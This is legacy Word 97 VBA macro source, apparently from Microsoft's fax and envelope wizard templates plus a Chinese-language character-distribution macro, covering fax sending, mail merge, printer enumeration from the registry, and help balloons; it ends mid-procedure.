Dim strTemp As String, strFaxFld As String

    Set objVars = ActiveDocument.Variables
    objVars.Add strNUM_RCPNTS, iNumRcpnts
    
    If fSaveRcpnts Then
        If (iNumRcpnts > 0) Then
            For i = 1 To iNumRcpnts
                objVars.Add strRCPNT_NAME & i, rgstrRcpntFaxNames(i - 1)
                objVars.Add strRCPNT_NUMBER & i, rgstrRcpntFaxNums(i - 1)
            Next i
        End If
    End If
    
    If (fNoCovSht) Then
        objVars.Add "Cover Sheet Present", "0"
    Else
        objVars.Add "Cover Sheet Present", "1"
    End If
    
    strFaxFld = " "
    'store what fax option user chose.
    If (iFaxOption = iDIFF_FAX) Then
        objVars.Add "MS Fax Present", "0"
        objVars.Add "Fax Printer", formWizard.cboFaxDriver.Text
    Else
        objVars.Add "MS Fax Present", "1"
        If fDocIsFormLtr Then
            strFaxFld = formWizard.cboFldsFaxNum.Value
        Else
            strFaxFld = strFLD_FAX_NUMBER
        End If
    End If
    
    objVars.Add "Fax Field Name", strFaxFld

    'if doc. is present and is to be faxed then store relevant info. about doc.
    If (fDocPresent And (Not (formWizard.optCovSht.Value))) Then
        objVars.Add "Main Doc Present", "1"
        objVars.Add "Main Document Name", objMainDoc.Name
        
        'is the field a fax number or an Address Book Entry???
        If (fDocIsFormLtr) Then objVars.Add "Through Email", _
                formWizard.optFldFaxEntry.Value

    Else
        
        objVars.Add "Main Doc Present", "0"
    
    End If
    
End Sub


'removes vbCR & vbLF from the end of the string
'until the last character is not a vbLf or vbCr
Public Function StrRemoveCrLfFromEnd(strText As String) As String
    Dim strChar As String
    Dim i As Integer

    i = Len(strText)
    If (i = 0) Then GoTo LEnd

    strChar = Mid$(strText, i, 1)
    'check for the last character
    While (strChar = vbLf) Or (strChar = vbCr)
        i = i - 1
        strChar = Mid$(strText, i, 1)
    Wend
    
LEnd:
    StrRemoveCrLfFromEnd = Left$(strText, i)
End Function
'counts the number of lines in a string
Public Function ICountLines(ByVal strWhat As String, strNewText As String, iMax As Integer) As Integer
    Dim cLines As Integer, iPos As Integer
    
    strNewText = ""
    cLines = 0
    iPos = InStr(strWhat, vbCr)
    While iPos
        If iPos < Len(strWhat) Then
            If cLines < iMax Then strNewText = strNewText & Left$(strWhat, iPos - 1)
            cLines = cLines + 1
            strWhat = Mid$(strWhat, iPos + 1)
            iPos = InStr(strWhat, vbCr)
        Else
            If cLines < iMax Then strNewText = strNewText & Left$(strWhat, iPos - 1)
            If Len(strWhat) > 1 Then cLines = cLines + 1
            strWhat = ""
            iPos = 0
        End If
    Wend
    If strWhat <> "" Then
        If cLines < iMax Then strNewText = strNewText & strWhat
        cLines = cLines + 1
    End If
    
    ICountLines = cLines

End Function  ' CountLines

'inserts a field of type iFldType at the given range with strText as the text. Field replaces the text in objRng
'so pass a collapsed range always.and updates the range to be at the end
'of the inserted field.
Private Sub InsertField(objRng As Range, iFldType, strText As String, fPreserveFormatting)
    Dim objFld As Field
    
    On Error GoTo FatalError

    Set objFld = objRng.Fields.Add(objRng, iFldType, strText, fPreserveFormatting)
    
    Set objRng = objFld.result
    With objRng
        .Collapse wdCollapseEnd
        .End = .End + 1
        .Start = .End
    End With
    
    Exit Sub
FatalError:
    ReportError Err
    
End Sub
'replaces all occurences of vbCR & vbLF with the delimiter string in strText
'returns the new string
Private Function StrReplaceCrLfWithText(strText As String, strDelim As String) As String
    Dim strRet As String, strTmp As String
    
    strRet = ""
    strTmp = strText
    If Len(strTmp) = 0 Then GoTo LEnd
    
    strRet = StrRemoveCrLfFromEnd(strTmp)
    'remove vbLf thro' search and replace
    strTmp = StrSearchReplace(strRet, vbLf, "")
    'now replace all occurrences of vbCr with strDelim
    strRet = StrSearchReplace(strTmp, vbCr, strDelim)
LEnd:
    StrReplaceCrLfWithText = strRet

End Function

'removes the character strSrch from strText.
'caller should make sure that strSrch is a one character string
'returns the string stripped off the character
Private Function StrSearchReplace(strText As String, strSrch As String, strReplace As String)
    Dim strRet As String, strTmp As String
    Dim iPos As Integer
    
    strRet = ""
    strTmp = strText

    iPos = InStr(strTmp, strSrch)
    
    While (iPos) 'presence of strChar
        strRet = strRet & Left$(strTmp, iPos - 1)
        If (iPos < Len(strTmp)) Then
            strRet = strRet & strReplace
            strTmp = Mid$(strTmp, iPos + 1)
            iPos = InStr(strTmp, strSrch)
        Else 'strSrch is the last character
            strTmp = ""
            iPos = 0
        End If
    Wend
        
    'append whatever is left of the original string
    strRet = strRet & strTmp

    StrSearchReplace = strRet
End Function

'Errors in SaveRcpntsInDocVars & CreateCmdBar gets propagated back
'this function
Public Sub SetupDocForFax(fDummy As Boolean)
    On Error GoTo FatalError

    If iFaxOption = iNO_FAX Then Exit Sub

    If (Not (fDocIsFormLtr)) And (iNumRcpnts = 0) And (iFaxOption = iMS_FAX) _
            Then Exit Sub
        
    'dont save recipient info for form letter
    SaveRcpntsInDocVars (Not (fDocIsFormLtr))
    
    If (fNoCovSht) Then 'fax the doc.
        If (Not (fDocIsFormLtr)) Then
            FaxRegDoc
        Else
            FaxFormLtr
        End If
    Else
        CreateCmdBar
    End If

    Exit Sub
FatalError:
    DisplayErrorMsg strERR_CREATING_CMDBAR
    ReportError Err
End Sub
'Error will be taken care of in SetupDocForFax
Private Sub CreateCmdBar()
Dim objCmdBar As CommandBar
Dim objBtn As CommandBarButton

    Application.CustomizationContext = ActiveDocument
    Set objCmdBar = Application.CommandBars.Add(strCMD_BAR_TITLE, Position:=msoBarFloating, Temporary:=True)

    'Add a button
    Set objBtn = objCmdBar.Controls.Add(msoControlButton, Temporary:=True)
    objBtn.Style = msoButtonCaption
    objBtn.Caption = strCMD_BTN_TEXT
    
    If (Not (fDocIsFormLtr)) Then
        objBtn.OnAction = "Fax.FaxRegDoc"
    Else
        objBtn.OnAction = "Fax.FaxFormLtr"
    End If
    
    objCmdBar.Visible = True
    
    fCreatedCmdBar = True
    Exit Sub

End Sub

'Cover sheet is deleted after faxing if no cover sheet is opted by user. So,
'Activedocument is new cover sheet doc.
Private Sub FaxRegDoc()

Dim fMSFax As Boolean
Dim fCovSht As Boolean
Dim iNumRcpnts As Integer
Dim rgstrFaxNames(iMAX_RCPNTS) As String
Dim rgstrFaxNums(iMAX_RCPNTS) As String
Dim i As Integer
Dim strDocName As String
Dim objVars As Variables
Dim fMainDocPresent As Integer
Dim strErrorMsg As String
Dim strFaxPrinter As String, strActivePrinter As String
Dim objTmpMM As MailMerge, strFaxFld As String
Dim fSendMailAttach As Boolean


    On Error GoTo FatalError
    strErrorMsg = strERR_SEND_FAX
    fSendMailAttach = Application.Options.SendMailAttach
    
    Set objVars = ActiveDocument.Variables
    
    iNumRcpnts = Val(objVars(strNUM_RCPNTS).Value)
    
    fCovSht = Val(objVars("Cover Sheet Present").Value)
    fMSFax = Val(objVars("MS Fax Present").Value)
    fMainDocPresent = Val(objVars("Main Doc Present").Value)
    strFaxFld = objVars("Fax Field Name").Value
    
    If fMainDocPresent Then
        'obtain handle to main document
        strDocName = objVars("Main Document Name").Value
        If FInvalidMainDoc(objMainDoc, strDocName) Then Exit Sub
        'Set objMainDoc = Application.Documents(strDocName)
    End If
          
    For i = 1 To iNumRcpnts
        rgstrFaxNames(i - 1) = objVars(strRCPNT_NAME & i).Value
        rgstrFaxNums(i - 1) = objVars(strRCPNT_NUMBER & i).Value
    Next i
    
    'if nonMSFax, then set the Fax driver to be the current printer
    If (Not (fMSFax)) Then
        strActivePrinter = Application.ActivePrinter
        strFaxPrinter = objVars("Fax Printer").Value
        If Len(strFaxPrinter) = 0 Then strFaxPrinter = " "
        Application.ActivePrinter = strFaxPrinter
     End If
    
    'fax the cover sheet first
    If (fCovSht) Then
        If (iNumRcpnts > 1) Then
            Set objTmpMM = ActiveDocument.MailMerge
            If fMSFax Then
                objTmpMM.Destination = wdSendToFax
                'MsgBox "MailMerging the cover sheet"
            Else 'non MS fax
                objTmpMM.Destination = wdSendToPrinter
            End If
            objTmpMM.MailAsAttachment = True
            objTmpMM.MailAddressFieldName = strFaxFld
            StatusBar = strFAXING_CS_RECIPIENTS
            objTmpMM.Execute
            
        ElseIf (iNumRcpnts = 1) And fMSFax Then
            StatusBar = strFAXING_CS_TO & " " & rgstrFaxNums(0) & "..."
            Application.Options.SendMailAttach = True
            ActiveDocument.SendFax rgstrFaxNums(0)
                'MsgBox "Faxing to  " & rgstrFaxNames(0) & rgstrFaxNums(0)
        Else 'non MS fax
            StatusBar = strFAXING_CS_RECIPIENT & "..."
            ActiveDocument.PrintOut
        End If
    End If
    
    If fMainDocPresent = 0 Then GoTo LResetPrinter 'if no main doc. then deesh
    
    If (iNumRcpnts = 0) And Not (fMSFax) Then objMainDoc.PrintOut
    
    'send the main doc.
    If fMSFax Then Application.Options.SendMailAttach = True
    For i = 0 To iNumRcpnts - 1
        If fMSFax Then
            StatusBar = strFAXING_DOC_TO & " " & rgstrFaxNums(i)
            objMainDoc.SendFax rgstrFaxNums(i)
            'MsgBox "Faxing to  " & rgstrFaxNames(i) & rgstrFaxNums(i)
        Else
            StatusBar = strFAXING_DOC_RECIPIENT & " " & CStr(i + 1) & "..."
            objMainDoc.PrintOut
        End If
        
    Next i
    
LResetPrinter:
'reset printer for non MS fax
    If fMSFax Then
        Application.Options.SendMailAttach = fSendMailAttach
    Else
        Application.ActivePrinter = strActivePrinter
    End If
    DisplayPostWizTip strMSG_FAX_SUCCESS, True
    'DeleteCmdBar strCMD_BAR_TITLE
    Exit Sub
    
FatalError:
    i = Err.Number
    If i Then strErrorMsg = strErrorMsg & vbCr & Err.Description
    'if Fax not installed error message
    If i = iERR_FAX_NOT_INSTALLED Then _
        strErrorMsg = strErrorMsg & vbCr & strHLP_FAX_INSTALL
    DisplayTip strErrorMsg
'reset printer for non MS fax
    If fMSFax Then
        Application.Options.SendMailAttach = fSendMailAttach
    Else
        Application.ActivePrinter = strActivePrinter
    End If
    
    If i = iERR_FAX_NOT_INSTALLED Then
        DisplayHelp strWIN_HELP_FILE, lCNTXT_FAX_INSTALL
    ElseIf i = iERR_FAX_NOT_SENT And fMSFax Then
        DisplayHelp strFAX_HELP_FILE, lCNTXT_FAX_SEND
    End If
End Sub
'Cover sheet is deleted after faxing if no cover sheet is opted by user. So,
'Activedocument is new cover sheet doc.
Private Sub FaxFormLtr()

Dim fMSFax As Boolean
Dim fCovSht As Boolean
Dim i As Integer
Dim strDocName As String
Dim iDestination As Long
Dim objVars As Variables
Dim fMainDocPresent As Integer
Dim strErrorMsg As String
Dim strFaxPrinter As String, strActivePrinter As String
Dim objTmpMM As MailMerge, strFaxFld As String

    On Error GoTo FatalError

    strErrorMsg = strERR_SEND_FAX
    Set objVars = ActiveDocument.Variables

    fCovSht = Val(objVars("Cover Sheet Present").Value)
    fMSFax = Val(objVars("MS Fax Present").Value)
    fMainDocPresent = Val(objVars("Main Doc Present").Value)
    strFaxFld = objVars("Fax Field Name").Value
    
    If fMainDocPresent Then
        'obtain handle to main document
        strDocName = objVars("Main Document Name").Value
        If FInvalidMainDoc(objMainDoc, strDocName) Then Exit Sub
        'Set objMainDoc = Application.Documents(strDocName)
    End If
    
    If fMSFax Then
        If Val(objVars("Through Email").Value) Then
            iDestination = wdSendToEmail
        Else
            iDestination = wdSendToFax
        End If
    Else
        iDestination = wdSendToPrinter
        'if nonMSFax, then set the Fax driver to be the current printer
        strActivePrinter = Application.ActivePrinter
        strFaxPrinter = objVars("Fax Printer").Value
        If Len(strFaxPrinter) = 0 Then strFaxPrinter = " "
        Application.ActivePrinter = strFaxPrinter
    End If
    
    'send the coversheet first
    If (fCovSht) Then
        Set objTmpMM = ActiveDocument.MailMerge
        objTmpMM.Destination = iDestination 'MsgBox "MailMerging activdoc (coversheet) "
        objTmpMM.MailAddressFieldName = strFaxFld
        objTmpMM.MailAsAttachment = True
        StatusBar = strFAXING_CS_RECIPIENTS
        objTmpMM.Execute
    End If
 
    If fMainDocPresent = 0 Then GoTo LResetPrinter
    
    'fax the main document
    Set objTmpMM = objMainDoc.MailMerge
    objTmpMM.Destination = iDestination
    objTmpMM.MailAddressFieldName = strFaxFld
    objTmpMM.MailAsAttachment = True
    StatusBar = strFAXING_DOC_RECIPIENTS
    objTmpMM.Execute
    'MsgBox "MailMerging main doc."

LResetPrinter:
'reset printer for non MS fax
    ActiveDocument.Fields.Update
    If (Not (fMSFax)) Then Application.ActivePrinter = strActivePrinter
    DisplayPostWizTip strMSG_FAX_SUCCESS, True
    'DeleteCmdBar strCMD_BAR_TITLE
    Exit Sub
    
FatalError:
    i = Err.Number
    If i Then strErrorMsg = strErrorMsg & vbCr & Err.Description
    'if Fax not installed error message
    If i = iERR_FAX_NOT_INSTALLED Then _
        strErrorMsg = strErrorMsg & vbCr & strHLP_FAX_INSTALL
        
    DisplayTip strErrorMsg
    
'reset printer for non MS fax
    If (Not (fMSFax)) Then Application.ActivePrinter = strActivePrinter
    
    If i = iERR_FAX_NOT_INSTALLED Then
        DisplayHelp strWIN_HELP_FILE, lCNTXT_FAX_INSTALL
    ElseIf i = iERR_FAX_NOT_SENT And fMSFax Then
        DisplayHelp strFAX_HELP_FILE, lCNTXT_FAX_SEND
    End If
End Sub

'To display help using help files. Assuming that the help files are present in
'the windows directory
Private Sub DisplayHelp(strFile As String, ByVal lContext As Long)
    Dim iSize As Integer
    Dim strTmpBuffer As String
    Dim j As Integer, i As Integer
    Dim strWinDir As String, strWndName As String
    Dim hOpusWin As Long, lResult As Long
    Dim strMacroName As String
    
    'Get windows directory
    i = 512
    strTmpBuffer = String$(i, 0)
    j = 0
    strWinDir = ""
    j = GetWindowsDirectory(strTmpBuffer, i)
    
    If j Then
        If (j > i) Then j = i
        
        strWinDir = Left$(strTmpBuffer, j)
        If Right$(strWinDir, 1) <> strPathSeparator Then _
            strWinDir = strWinDir & strPathSeparator
    End If
    
    'Find word's window
    strWndName = strMS_WORD
    If ActiveWindow.WindowState = wdWindowStateMaximize Then _
        strWndName = strWndName & " - " & ActiveWindow.Caption
    hOpusWin = FindWindow("OpusApp", strWndName)
    If hOpusWin = 0 Then GoTo LNotFindWindow
    
    'display help
    strMacroName = "JH(" & strQUOTE & strQUOTE & " , " & lContext & ")"
    lResult = WinHelp(hOpusWin, strWinDir & strFile, HELP_COMMAND, strMacroName)
    
LNotFindWindow:
End Sub
'displays a tip during post-wizard options
'assumes that Assistant is present since it is called from post-wizard balloon
Private Sub DisplayTip(strTip As String)
    Dim objBlnTip As Balloon
    On Error GoTo FatalError
    
    Set objBlnTip = Assistant.NewBalloon
    
    With objBlnTip
        .Mode = msoModeModal
        .Heading = strWizName
        .Text = strTip
        .Button = msoButtonSetOK
    End With
    objBlnTip.Show
    
    If Assistant.BalloonError <> msoBalloonErrorNone Then GoTo FatalError

    Exit Sub

FatalError:
    Err.Clear
    'MsgBox strTip, vbOKOnly + vbApplicationModal, strWizName
End Sub
'ROUTINES TO OBTAIN PRINTERS FROM REGISTRY
'fills rgstrPrinterNames with the local and remote printer names obtained
'from the registry. iTotalNumPrinters has the number of printer
'names obtained.
Sub GetAllPrinters()
Dim i As Integer

    iTotalNumPrinters = 0
    
    GetLocalPrinters
    GetRemotePrinters
    
    If (iTotalNumPrinters > 0) Then
        ReDim Preserve rgstrPrinterNames(iTotalNumPrinters - 1)
        formWizard.cboFaxDriver.List = rgstrPrinterNames
        formWizard.cboFaxDriver.ListIndex = 0
    End If
    'if no printers, then the user can use cmdOtherPrinters to select one
    'if we failed to enumerate some printer
    
End Sub
Sub GetRemotePrinters()
    Dim hr As Long
    Dim hSubKey As Long

    hr = RegOpenKey(HKEY_LOCAL_MACHINE, strREG_PROVIDERS, hSubKey)
    If hr <> ERROR_SUCCESS Then Exit Sub
    
    GetRemotePrinterNames (hSubKey)

    RegCloseKey (hSubKey)
    
End Sub

Sub GetProviderPrinters(strProvider As String)
Dim hr As Long
Dim hKeyProviderServers As Long
Dim lpPrinterServer As String, strPrinterServer As String
Dim cbPrinterServer As Long
Dim dwPrinterIndex As Long
Dim lRet As Long, iLenPrinterServer As Integer

    cbPrinterServer = 256
    lpPrinterServer = String$(cbPrinterServer, 0)
    dwPrinterIndex = 0


    hr = RegOpenKey(HKEY_LOCAL_MACHINE, strREG_PROVIDERS & strProvider & "\Servers", hKeyProviderServers)

    If hr <> ERROR_SUCCESS Then GoTo LEndGetProviderPrinters
            
    lRet = ERROR_SUCCESS
    While (lRet = ERROR_SUCCESS)
        lpPrinterServer = String$(cbPrinterServer, 0)
        
        hr = RegEnumKey(hKeyProviderServers, dwPrinterIndex, lpPrinterServer, cbPrinterServer)
        
        If hr <> ERROR_SUCCESS Then GoTo LCloseProviderServersKey
        
        iLenPrinterServer = InStr(lpPrinterServer, Chr$(0))
        If (iLenPrinterServer > 1) Then 'no name
            strPrinterServer = Left$(lpPrinterServer, iLenPrinterServer - 1)
            GetPrinterNamesFromServer strProvider, strPrinterServer
        End If

        dwPrinterIndex = dwPrinterIndex + 1
    Wend
        
LCloseProviderServersKey:
    RegCloseKey (hKeyProviderServers)
    
LEndGetProviderPrinters:
End Sub

Sub GetPrinterNamesFromServer(strProvider As String, strPrinterServer As String)
Dim hr As Long
Dim hKeyPrinterServers As Long
Dim lpPrinterName As String, strPrinterName As String
Dim strPrinter As String
Dim cbPrinterName As Long
Dim dwPrinterIndex As Long
Dim lRet As Long, iLenPrinterName As Integer
Dim strRegPrinterServers As String


    cbPrinterName = 256
    lpPrinterName = String$(cbPrinterName, 0)
    dwPrinterIndex = 0

    On Error Resume Next
    strRegPrinterServers = strREG_PROVIDERS & strProvider & "\Servers\" & strPrinterServer & "\Printers"
    hr = RegOpenKey(HKEY_LOCAL_MACHINE, strRegPrinterServers, hKeyPrinterServers)

    If hr <> ERROR_SUCCESS Then GoTo LEndGetProviderPrinters
            
    lRet = ERROR_SUCCESS
    While (lRet = ERROR_SUCCESS)
        lpPrinterName = String$(cbPrinterName, 0)
        
        lRet = RegEnumKey(hKeyPrinterServers, dwPrinterIndex, lpPrinterName, cbPrinterName)
        
        If lRet <> ERROR_SUCCESS Then GoTo LClosePrinterServersKey
        
        iLenPrinterName = InStr(lpPrinterName, Chr$(0))
        If (iLenPrinterName > 1) Then 'no name
            strPrinter = Left$(lpPrinterName, iLenPrinterName - 1)
            strPrinterName = ""
            strPrinterName = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\" & strRegPrinterServers & "\" & strPrinter, "Name")
            
            If Len(strPrinterName) <> 0 Then
                If (iTotalNumPrinters Mod 10) = 0 Then _
                    ReDim Preserve rgstrPrinterNames(iTotalNumPrinters + 10)
                rgstrPrinterNames(iTotalNumPrinters) = UCase$("\\" & strPrinterServer & "\" & strPrinterName)
                iTotalNumPrinters = iTotalNumPrinters + 1
            End If
        End If

        dwPrinterIndex = dwPrinterIndex + 1
    Wend
        
LClosePrinterServersKey:
    RegCloseKey (hKeyPrinterServers)
    
LEndGetProviderPrinters:

End Sub

Sub GetRemotePrinterNames(hKey As Long)
    Dim dwProviderIndex As Long
    Dim cbProviderName As Long
    Dim lpProviderName As String
    Dim lRet As Long, iLenProviderName  As Integer

    Dim strProviderName As String
  
    cbProviderName = 256
    dwProviderIndex = 0

    lRet = ERROR_SUCCESS
    
    'get the list of providers and call GetProviderPrinters for each provider
    While (lRet = ERROR_SUCCESS)
        lpProviderName = String$(cbProviderName, 0)
        
        lRet = RegEnumKey(hKey, dwProviderIndex, lpProviderName, cbProviderName)
        
        If (lRet <> ERROR_SUCCESS) Then GoTo LEnd
        
        iLenProviderName = InStr(lpProviderName, Chr$(0)) 'length of provider name
        
        If (iLenProviderName > 1) Then
            strProviderName = Left$(lpProviderName, iLenProviderName - 1)
            GetProviderPrinters (strProviderName)
        End If

        dwProviderIndex = dwProviderIndex + 1
    Wend
    
LEnd:

End Sub

Sub GetLocalPrinters()
    Dim hr As Long
    Dim hSubKey As Long

    hr = RegOpenKey(HKEY_LOCAL_MACHINE, strREG_LOCAL_PRINTERS, hSubKey)
    If hr <> ERROR_SUCCESS Then Exit Sub

    GetLocalPrinterNames (hSubKey)

    RegCloseKey (hSubKey)
    
End Sub

Sub GetLocalPrinterNames(hKey As Long)

Dim lpPrinterName As String, strPrinterName As String
Dim strPrinter As String
Dim cbPrinterName As Long
Dim dwPrinterIndex As Long
Dim lRet As Long, iLenPrinterName As Integer

    cbPrinterName = 256
    dwPrinterIndex = 0

    On Error Resume Next
    
    lRet = ERROR_SUCCESS
    While (lRet = ERROR_SUCCESS)
        lpPrinterName = String$(cbPrinterName, 0)
        
        lRet = RegEnumKey(hKey, dwPrinterIndex, lpPrinterName, cbPrinterName)
        
        If lRet <> ERROR_SUCCESS Then GoTo LEndLocalPrinters
        
        iLenPrinterName = InStr(lpPrinterName, Chr$(0))
        If (iLenPrinterName > 1) Then 'no name
            strPrinter = Left$(lpPrinterName, iLenPrinterName - 1)
            strPrinterName = ""
            strPrinterName = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\" & strREG_LOCAL_PRINTERS & strPrinter, "Name")
            
            If Len(strPrinterName) <> 0 Then 'if valid name, add to list
                If (iTotalNumPrinters Mod 10) = 0 Then _
                    ReDim Preserve rgstrPrinterNames(iTotalNumPrinters + 10)
                
                rgstrPrinterNames(iTotalNumPrinters) = UCase$(strPrinterName)
                
                iTotalNumPrinters = iTotalNumPrinters + 1
            End If
        End If

        dwPrinterIndex = dwPrinterIndex + 1
    Wend
        
    
LEndLocalPrinters:
End Sub

'displays post wizard tip in an autodown balloon if Assistant is visible
Public Sub DisplayPostWizTip(strTip As String, fMsgBox As Boolean)

    Dim objTipBalloon As Balloon

    On Error GoTo TipError
    If fMsgBox Then
        If Assistant.Visible = False Then GoTo TipError
    End If
    Set objTipBalloon = Assistant.NewBalloon
    With objTipBalloon
        .Mode = msoModeAutoDown
        .Heading = strWizName
        .Button = msoButtonSetNone
        .Text = strTip
    End With
    objTipBalloon.Show

    If Assistant.BalloonError <> msoBalloonErrorNone Then GoTo TipError
    
TipError:
    Err.Clear
    If fMsgBox Then MsgBox strTip, vbInformation + vbOKOnly + vbApplicationModal, strWizName
End Sub

Private Function FInvalidMainDoc(objMainDoc As Document, strDocName As String) As Boolean
    On Error GoTo NoDoc
    Set objMainDoc = Application.Documents(strDocName)
    FInvalidMainDoc = False
    Exit Function
NoDoc:
    DisplayErrorMsg strERR_NO_MAIN_DOC1 & strDocName & strERR_NO_MAIN_DOC2
    FInvalidMainDoc = True
End Function

Public Sub DeleteCmdBar(strCmdBarName)
    On Error Resume Next
    Application.CommandBars(strCmdBarName).Delete
    Err.Clear
End Sub


Function GetCurFont(rgn As Range) As Font
    On Error GoTo LError
    If (rgn.Font.Size = 9999999) Then
        If (rgn.Characters(1).Font.Size = 9999999) Then
            Set GetCurFont = ActiveDocument.Styles(rgn.Paragraphs(1).Style).Font
        Else
            Set GetCurFont = rgn.Characters(1).Font
        End If
    Else
        Set GetCurFont = rgn.Font
    End If
    Exit Function
LError:
    MsgBox Err.Description
End Function

'returns the value stored in registry key strId
Public Function StrFetchPref(strId As String) As String
    On Error GoTo LReturnNull
    
    StrFetchPref = System.PrivateProfileString("", strRegSettingsKey, strId)
    Exit Function
LReturnNull:
    StrFetchPref = ""
End Function

'returns the string stored in strId. If empty, returns strDefault
Public Function StrRestorePref(strId As String, strDefault As String) As String
    Dim strTemp As String

    strTemp = StrFetchPref(strId)
    ' If length is 0, it wasn't in regsistry, so use default value
    If Len(strTemp) = 0 Then
        strTemp = strDefault
    ' "~" is a placeholder to allow returning empty strings
    ElseIf strTemp = "~" Then
        strTemp = ""
    End If
    
    StrRestorePref = strTemp
End Function

' --------------------------------------------------------------------------------------
' WORD 97 MINI-WIZARD
' Envelope Wizard Specific Code
' --------------------------------------------------------------------------------------

Option Explicit

' --------------------------------------------------------------------------------------
' DECLARATIONS
' --------------------------------------------------------------------------------------

Public Const strWIZ_NAME = "信封精靈"
Public Const iBALLOON_OPTIONS = 2 ' Number of items in InitialBalloon (First=1)
Public Const strBALLOON_HEADING = "歡迎使用信封精靈。"
Public Const strOPTION_ONE_ACCELERATOR = "C"   'This is the form accelerator for strInitialBalloon(0)
Public Const strOPTION_TWO_ACCELERATOR = "e"   'This is the form accelerator for strInitialBalloon(1)
Public strInitialBalloon(iBALLOON_OPTIONS) As String
Public strHelpTip(iBALLOON_OPTIONS) As String

Public Sub InitWizardStrings()
  
' NOTE: change constant  iBALLOON_OPTIONS if number of items in list changes
    ' Balloon / Form menu options
    strInitialBalloon(0) = "建立一信封"
    strInitialBalloon(1) = "建立郵寄清單中的所有信封"

    ' Assistant help messages
strHelpTip(0) = "請鍵入信封上寄件人及收件人的地址。或者是從 Microsoft Outlook 連絡人或 Microsoft Exchange 個人通訊錄中按一下「通訊錄」按鈕使用其中的名單。當您鍵入地址之後請按「列印」。"
strHelpTip(1) = "您可以使用合併列印的功能來建立信封。假如您需要幫忙，那麼在合併列印對話方塊頂端的說明將會引導您完成總共有三步驟的程序。"

End Sub  ' InitWizardStrings

Public Function fnInitialBalloon(iBtn)
    
    'On Error GoTo ErrorInitBalloon
    
    Select Case iBtn
        Case Is < 1 'Exit
            ActiveDocument.Close wdDoNotSaveChanges
        Case 1 ' Open the envelope dialog
            If fAssistantAvailable Then ShowAssistantTip
            Application.Dialogs(wdDialogToolsCreateEnvelope).Show
            If fAssistantAvailable Then objHelpTipBalloon.Close
        Case 2 ' Start a Mail Merge to envelopes
            ActiveDocument.MailMerge.MainDocumentType = wdEnvelopes
            If fAssistantAvailable Then ShowAssistantTip
            Application.Dialogs(wdDialogMailMergeHelper).Show
            If fAssistantAvailable Then objHelpTipBalloon.Close
    End Select
    Exit Function
    
End Function ' fnInitialBalloon

' End Envelope Wizard Module
Private Const SZ_MACRONAME = "文字均等分"
Global iPrevChars As Integer

Sub Insert()
    Dim n As Integer
    Dim para As Paragraph
    Dim fld As Field
    
    On Error GoTo LError
    
    Application.ScreenUpdating = False
    System.Cursor = wdCursorWait
    n = 2
    With Selection
        If ((Selection.Start = Selection.End) And (.Text = Chr$(21))) Then
            .MoveRight , 1, 1
        End If
        
        For Each fld In .Fields
            A$ = fld.Code
            If (FIsDistField(A$)) Then
                iTop = InStr(1, A$, ",")
                iEnd = InStr(1, A$, ")") - 1
                n = iEnd - iTop
                dlgDist.ID_RESET.Enabled = True
                GoTo LSkip
            ElseIf (InStr(1, A$, "eq") <> 0) Then
                MsgBox "此字串未均等分", Title:=SZ_MACRONAME
                GoTo LExit:
            End If
        Next fld
        dlgDist.ID_RESET.Enabled = False
        If (Len(Selection.Text) < 2) Then
            MsgBox "請選取要均等分的字串，且字串要有兩個字以上。", Title:=SZ_MACRONAME
            GoTo LExit
        ElseIf (Len(Selection.Text) = 2) And _
                (Right(Selection.Text, 1) = Chr$(13)) Then
                MsgBox "換行符號、定位點及功能變數都不算是一個字，請重新選擇要均等分的字串。", Title:=SZ_MACRONAME
                GoTo LExit
        ElseIf (Len(Selection.Text) = 2) And _
                (Right(Selection.Text, 1) = Chr$(9)) Then
                MsgBox "換行符號、定位點及功能變數都不算是一個字，請重新選擇要均等分的字串。", Title:=SZ_MACRONAME
                GoTo LExit
        End If
        If (InStr(1, Selection.Text, Chr$(13)) <> 0) Then
            For Each para In .Paragraphs
                If (n < (Len(para.Range.Text) - 1)) Then
                    n = Len(para.Range.Text) - 1
                End If
            Next para
        Else
            n = Len(Selection.Text)
        End If
        If (n < iPrevChars) Then
            n = iPrevChars
        End If
    End With

LSkip:
    If (n > 32) Then
        n = 32
    ElseIf (n < 1) Then
        n = 1
    End If
    dlgDist.IDCS_SIZE.Value = n
    dlgDist.IDCE_SIZE.Text = n
    dlgDist.IDCE_SIZE.IMEMode = fmIMEModeNoControl
    dlgDist.IDCE_SIZE.SetFocus
    dlgDist.IDCE_SIZE.SelStart = 0
    dlgDist.IDCE_SIZE.SelLength = 99
    
    Application.ScreenUpdating = True
    System.Cursor = wdCursorNormal
    
    dlgDist.Show

LExit:
    Exit Sub
LError:
    MsgBox Err.Description, Title:=SZ_MACRONAME
End Sub

Sub Create(n As Integer)
    Dim rgn As Range
    Dim rgnTmp As Range
    Dim rgnOrg As Range
    Dim para As Paragraph
    Dim cmdb As CommandBar
    
    On Error GoTo LError
    Application.ScreenUpdating = False
    System.Cursor = wdCursorWait
    
    With Selection
        Set rgnOrg = .Range
        For Each para In rgnOrg.Paragraphs
            If (InStr(1, rgnOrg.Text, Chr$(13)) <> 0) Then
                Set rgn = para.Range
                If (para.Range.Start < rgnOrg.Start) Then
                    rgn.SetRange rgnOrg.Start, rgn.End - 1
                ElseIf (para.Range.End > rgnOrg.End) Then
                    rgn.SetRange rgn.Start, rgnOrg.End - 1
                Else
                    rgn.SetRange rgn.Start, rgn.End - 1
                End If
                rgn.Select
            Else
                Set rgn = rgnOrg
            End If
            cLineBreak = InStr(1, rgn.Text, Chr$(11))
            If (cLineBreak <> 0) Then
                rgn.SetRange rgn.Start, rgn.Start + cLineBreak - 1
                rgn.Select
            End If
            If (.Fields.Count > 0) Then
                A$ = .Fields(1).Code
                If (FIsDistField(A$) = True) Then
                    Resize .Fields(1), n
                    GoTo LContinue
                End If
            End If
            
            C = Len(.Text)
            ' Remove Additional Spaces
            sz$ = .Text
            x = 0
            While (FIsSpace(Right$(sz$, 1)) <> 0)
                sz$ = Left$(sz$, Len(sz$) - 1)
                x = x + 1
            Wend
            
            ' Create DistChar field
            ' {eq \o\ad(foo,     )}
            Set rgn = .Range
            If (x > 0) Then
                .MoveRight
                .MoveLeft unit:=wdCharacter, Count:=x
                .Delete unit:=wdCharacter, Count:=x
                rgn.Select
            End If
            .InsertAfter "," + String$(n, "　") + ")"
            .InsertBefore "eq \o\ad("
            rgn.SetRange rgn.Start + Len("eq \o\ad("), rgn.End
